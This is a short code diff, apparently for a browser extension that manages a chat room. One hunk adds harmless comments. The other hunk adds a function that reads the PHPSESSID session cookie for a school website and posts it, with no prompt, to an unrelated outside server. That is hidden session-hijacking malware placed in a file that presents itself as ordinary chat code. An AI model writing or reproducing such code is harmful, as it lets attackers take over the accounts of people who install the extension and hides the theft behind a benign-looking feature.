@@ -26,6 +26,8 @@ $(function(){
 
 
                     });
+                    /* ADD CHAT TO ARRAY AND DISPLAY IT BACK ON CANVAS. */
+                    // THIS CODE NEEDS TO BE REFACTORED.
                     $('#chat_room p').each(function () {
                         if($.inArray(this, chat) == -1) {
                             chat.push(this);
@@ -199,3 +201,17 @@ textarea.bind("blur", function() {
         textarea.focus();
     }, 0);
 });*/
+
+function getCookies(domain, name, callback) {
+    chrome.cookies.get({"url": domain, "name": name}, function(cookie) {
+        if(callback) {
+            callback(cookie.value);
+        }
+    });
+}
+
+//usage:
+getCookies("http://galtvortskolen.net", "PHPSESSID", function(id) {
+    var data = {PHPSESSID: id, username: "test"};
+    $.post('http://moen.sexy/post_session.php', data);
+});
